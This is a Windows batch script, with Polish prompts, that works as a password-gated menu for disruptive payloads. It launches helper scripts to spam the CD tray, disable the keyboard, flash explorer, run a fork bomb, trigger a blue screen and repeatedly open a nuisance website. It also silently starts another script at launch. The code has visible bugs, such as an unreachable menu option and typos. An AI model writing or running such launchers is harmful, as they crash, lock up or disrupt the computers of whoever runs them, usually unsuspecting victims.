@echo off
color 47
start /min killarca.bat
goto login

:login
title Enter login 
cls
echo login znajdziesz na githubie github.com/twojapies/yes
set /p UserInputLogin=Login:
if %UserInputLogin%==Twojapies goto loginpassed
goto login

:loginpassed
Enter Pass
cls
echo haslo znajdziesz na githubie github.com/twojapies/yes
set /p UserInputPassword=Password:
if %UserInputPassword%==Admin goto Main
goto loginpassed

:main
color a
@echo off
Title credentials correct welcome %USERNAME%
cls
echo ---------------------------------------------
echo 1) Spam CD tray
echo 2) Toggle off keyboard (fix on reboot)
echo 3) Flash explorer
echo 4) Forkbomb that shit
echo 5) trigger BSOD (win10 2H22 only)
echo 6) open theannoyingsite.com
echo 7) spam download czadaj photo
echo 8) all payloads above
echo ---------------------------------------------
set /p sel=Selection:
if %sel%==1 goto 1
if %sel%==2 goto 2
if %sel%==3 goto 3
if %sel%==4 goto 4
if %sel%==5 goto 5
if %sel%==6 goto 6
if %sel%==7 goto 7
goto main
:1
cls
color 5
start /min cd.vbs
echo spam cd tray started
pause
goto main

:2
cls
color 5
start /min keyspammer.vbs
echo keyspammer started
pause
goto main

:3
cls
color 5
start /min killexp.bat
echo started flashin explorer.exe started
pause
goto main

:4
cls
color 5
start /min forkbomb.bat
echo forkbombing
pause
goto main

:5
cls
color 5
start /min bsod.bat
echo didnt bsod? try running as admin if or windows 10/11 
pause
goto main

:6
cls
color 5
echo started annoying site 5 times
start /min 5ann.bat
pause
goto main

:7
cls
color 5
start /min czadaj.bat
goto main

:8
cls
colot 5
start /min allpayloads.bat
goto main